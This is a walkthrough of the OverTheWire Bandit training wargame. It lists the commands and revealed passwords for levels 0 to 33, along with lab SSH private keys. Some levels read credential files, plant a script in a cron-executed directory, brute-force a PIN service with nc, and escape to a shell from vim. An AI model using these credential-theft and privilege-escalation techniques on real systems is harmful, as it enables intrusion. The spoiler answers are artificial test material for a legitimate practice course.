# [Bandit](https://overthewire.org/wargames/bandit/)

## [Bandit Level 0](https://overthewire.org/wargames/bandit/bandit0.html)
```
$ ssh bandit.labs.overthewire.org -p 2220 -l bandit0
bandit0@bandit.labs.overthewire.org's password: bandit0
```

## [Bandit Level 0 → Level 1](https://overthewire.org/wargames/bandit/bandit1.html)
```
bandit0@bandit:~$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```

## [Bandit Level 1 → Level 2](https://overthewire.org/wargames/bandit/bandit2.html)
```
bandit1@bandit:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```

## [Bandit Level 2 → Level 3](https://overthewire.org/wargames/bandit/bandit3.html)
```
bandit2@bandit:~$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```

## [Bandit Level 3 → Level 4](https://overthewire.org/wargames/bandit/bandit4.html)
```
bandit3@bandit:~$ cat inhere/.hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```

## [Bandit Level 4 → Level 5](https://overthewire.org/wargames/bandit/bandit5.html)
```
bandit4@bandit:~$ file inhere/* | grep ASCII
inhere/-file07: ASCII text
bandit4@bandit:~$ cat inhere/-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```

## [Bandit Level 5 → Level 6](https://overthewire.org/wargames/bandit/bandit6.html)
```
bandit5@bandit:~$ find inhere/ -size 1033c
inhere/maybehere07/.file2
bandit5@bandit:~$ cat inhere/maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

## [Bandit Level 6 → Level 7](https://overthewire.org/wargames/bandit/bandit7.html)
```
bandit6@bandit:~$ find / -size 33c -user bandit7 -group bandit6 2> /dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```

## [Bandit Level 7 → Level 8](https://overthewire.org/wargames/bandit/bandit8.html)
```
bandit7@bandit:~$ grep millionth data.txt
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

## [Bandit Level 8 → Level 9](https://overthewire.org/wargames/bandit/bandit9.html)
```
bandit8@bandit:~$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```

## [Bandit Level 9 → Level 10](https://overthewire.org/wargames/bandit/bandit10.html)
```
bandit9@bandit:~$ strings data.txt | grep ===
========== the*2i"4
========== password
Z)========== is
&========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
```

## [Bandit Level 10 → Level 11](https://overthewire.org/wargames/bandit/bandit11.html)
```
bandit10@bandit:~$ cat data.txt | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```

## [Bandit Level 11 → Level 12](https://overthewire.org/wargames/bandit/bandit12.html)
```
bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```

## [Bandit Level 12 → Level 13](https://overthewire.org/wargames/bandit/bandit13.html)
```
bandit12@bandit:~$ mkdir -p /tmp/stuff && cp data.txt /tmp/stuff/ && cd /tmp/stuff
bandit12@bandit:/tmp/stuff$ xxd -r data.txt stuff.gz
bandit12@bandit:/tmp/stuff$ gunzip stuff.gz
bandit12@bandit:/tmp/stuff$ bunzip2 stuff
bunzip2: Can't guess original name for stuff -- using stuff.out
bandit12@bandit:/tmp/stuff$ mv stuff.out stuff.gz && gunzip stuff.gz
bandit12@bandit:/tmp/stuff$ tar -xf stuff
bandit12@bandit:/tmp/stuff$ tar -xf data5.bin
bandit12@bandit:/tmp/stuff$ bunzip2 data6.bin
bunzip2: Can't guess original name for data6.bin -- using data6.bin.out
bandit12@bandit:/tmp/stuff$ tar -xf data6.bin.out
bandit12@bandit:/tmp/stuff$ mv data8.bin data8.gz && gunzip data8.gz
bandit12@bandit:/tmp/stuff$ cat data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

## [Bandit Level 13 → Level 14](https://overthewire.org/wargames/bandit/bandit14.html)
```
bandit13@bandit:~$ cat sshkey.private
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----
```

## [Bandit Level 14 → Level 15](https://overthewire.org/wargames/bandit/bandit15.html)
```
bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
bandit14@bandit:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
```

## [Bandit Level 15 → Level 16](https://overthewire.org/wargames/bandit/bandit16.html)
```
bandit15@bandit:~$ openssl s_client -connect localhost:30001
<<SNIP>>
---
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
```

## [Bandit Level 16 → Level 17](https://overthewire.org/wargames/bandit/bandit17.html)
```
bandit16@bandit:~$ nmap localhost -p31000-32000 -sV -Pn -n
<<SNIP>>
PORT      STATE SERVICE     VERSION
31046/tcp open  echo
31518/tcp open  ssl/echo
31691/tcp open  echo
31790/tcp open  ssl/unknown
31960/tcp open  echo
<<SNIP>>
bandit16@bandit:~$ openssl s_client -connect localhost:31790
<<SNIP>>
---
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```

## [Bandit Level 17 → Level 18](https://overthewire.org/wargames/bandit/bandit18.html)
```
bandit17@bandit:~$ diff passwords.old passwords.new
42c42
< w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
---
> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
```

## [Bandit Level 18 → Level 19](https://overthewire.org/wargames/bandit/bandit19.html)
```
$ ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

## [Bandit Level 19 → Level 20](https://overthewire.org/wargames/bandit/bandit20.html)
```
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

## [Bandit Level 20 → Level 21](https://overthewire.org/wargames/bandit/bandit21.html)
On terminal 1:
```
bandit20@bandit:~$ nc -lvp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 33792
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

On terminal 2:
```
bandit20@bandit:~$ ./suconnect 9999
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
```

## [Bandit Level 21 → Level 22](https://overthewire.org/wargames/bandit/bandit22.html)
```
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

## [Bandit Level 22 → Level 23](https://overthewire.org/wargames/bandit/bandit23.html)
```
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

## [Bandit Level 23 → Level 24](https://overthewire.org/wargames/bandit/bandit24.html)
```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
bandit23@bandit:~$ printf '#!/bin/sh\ncat /etc/bandit_pass/bandit24 > /tmp/pass.txt' > /var/spool/bandit24/run.sh && chmod 777 /var/spool/bandit24/run.sh
bandit23@bandit:~$ cat /tmp/pass.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

## [Bandit Level 24 → Level 25](https://overthewire.org/wargames/bandit/bandit25.html)
```
bandit24@bandit:~$ for i in {0001..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> /tmp/wordlist; done
bandit24@bandit:~$ cat /tmp/wordlist | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
<<SNIP>>
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

## [Bandit Level 25 → Level 26](https://overthewire.org/wargames/bandit/bandit26.html)
```
bandit25@bandit:~$ cat bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
```

Reduce terminal size to very small so `more` won't quit:
```
$ ssh bandit.labs.overthewire.org -p 2220 -l bandit26 -i key
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
```

Type `v` enter `vim` then edit password file `:e /etc/bandit_pass/bandit26`:
```
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```

## [Bandit Level 26 → Level 27](https://overthewire.org/wargames/bandit/bandit27.html)
From previous, spawn a `bash` session from `vim`:
```
:set shell=/bin/bash
:!/bin/bash
```

Now pwn `bandit27`:
```
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```

## [Bandit Level 27 → Level 28](https://overthewire.org/wargames/bandit/bandit28.html)
```
bandit27@bandit:~$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo /tmp/repo
Cloning into '/tmp/repo'...
bandit27-git@localhost's password: 3ba3118a22e93127a4ed485be72ef5ea
remote: Counting objects: 3, done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (3/3), done.
bandit27@bandit:~$ cat /tmp/repo/README
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
```

## [Bandit Level 28 → Level 29](https://overthewire.org/wargames/bandit/bandit29.html)
```
bandit27@bandit:~$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo /tmp/repo
Cloning into '/tmp/repo'...
bandit27-git@localhost's password: 0ef186ac70e04ea33b4c1853d2526fa2
remote: Counting objects: 3, done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (3/3), done.
bandit27@bandit:~$ cd /tmp/repo
bandit28@bandit:/tmp/repo$ git log -p README.md
<<SNIP>>
-- password: bbc96594b4e001778eee9975372716b2
<<SNIP>>
```

## [Bandit Level 29 → Level 30](https://overthewire.org/wargames/bandit/bandit30.html)
```
bandit27@bandit:~$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo /tmp/repo
Cloning into '/tmp/repo'...
bandit29-git@localhost's password: bbc96594b4e001778eee9975372716b2
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0)
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.
bandit29@bandit:~$ cd /tmp/repo
bandit29@bandit:/tmp/repo$ git branch -r
  origin/HEAD -> origin/master
  origin/dev
  origin/master
  origin/sploits-dev
bandit29@bandit:/tmp/repo$ git checkout -B dev origin/dev
Branch dev set up to track remote branch dev from origin.
Switched to a new branch 'dev'
bandit29@bandit:/tmp/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: 5b90576bedb2cc04c86a9e924ce42faf
```

## [Bandit Level 30 → Level 31](https://overthewire.org/wargames/bandit/bandit31.html)
```
bandit27@bandit:~$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo /tmp/repo
Cloning into '/tmp/repo'...
bandit29-git@localhost's password: 5b90576bedb2cc04c86a9e924ce42faf
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0)
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.
bandit29@bandit:~$ cd /tmp/repo
bandit30@bandit:/tmp/repo$ git tag
secret
bandit30@bandit:/tmp/repo$ git show secret
47e603bb428404d265f59c42920d81e5
```

## [Bandit Level 31 → Level 32](https://overthewire.org/wargames/bandit/bandit32.html)
```
bandit27@bandit:~$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo /tmp/repo
Cloning into '/tmp/repo'...
bandit29-git@localhost's password: 47e603bb428404d265f59c42920d81e5
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0)
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.
bandit29@bandit:~$ cd /tmp/repo
bandit31@bandit:/tmp/repo$ rm .gitignore
bandit31@bandit:/tmp/repo$ echo 'May I come in?' > key.txt
bandit31@bandit:/tmp/repo$ git add -A
bandit31@bandit:/tmp/repo$ git commit -am 'May I come in?'
bandit31@bandit:/tmp/repo$ git push origin master
bandit31-git@localhost's password: 47e603bb428404d265f59c42920d81e5
Counting objects: 5, done.
Delta compression using up to 2 threads.
Compressing objects: 100% (3/3), done.
Writing objects: 100% (5/5), 497 bytes | 0 bytes/s, done.
Total 5 (delta 0), reused 0 (delta 0)
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: 56a9bf19c63d650ce78e6ec0354ee45e
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
To ssh://localhost/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'
```

## [Bandit Level 32 → Level 33](https://overthewire.org/wargames/bandit/bandit33.html)
```
WELCOME TO THE UPPERCASE SHELL
>> $0
$ /bin/bash
bandit33@bandit:~$ id
uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)
bandit33@bandit:~$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
```

## [Bandit Level 33 → Level 34](https://overthewire.org/wargames/bandit/bandit34.html)
> At this moment, level 34 does not exist yet.
